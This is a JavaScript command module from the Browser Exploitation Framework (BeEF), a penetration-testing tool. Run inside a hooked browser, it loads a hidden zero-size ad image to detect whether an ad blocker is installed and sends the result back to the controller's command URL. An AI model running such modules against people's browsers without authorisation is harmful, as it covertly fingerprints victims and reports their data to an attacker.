// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	if (document.getElementById('adblock_img')) {
		return "Img already created";
	}

	var img = new Image();
	img.setAttribute("style","visibility:hidden");
	img.setAttribute("width","0");
	img.setAttribute("height","0");
	img.src = 'http://simple-adblock.com/adblocktest/files/adbanner.gif';
	img.id = 'adblock_img';
	img.setAttribute("attr","start");
	img.onerror = function() {
		this.setAttribute("attr","error");
	};
	img.onload = function() {
		this.setAttribute("attr","load");
	};

	document.body.appendChild(img);

	setTimeout(function() {
		var img = document.getElementById('adblock_img');	
		if (img.getAttribute("attr") == "error") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Adblock returned an error');
		} else if (img.getAttribute("attr") == "load") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Adblock is disabled or not installed');
		} else if (img.getAttribute("attr") == "start") {
			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Adblock is enabled');
		};
		document.body.removeChild(img);
		}, 10000);

});
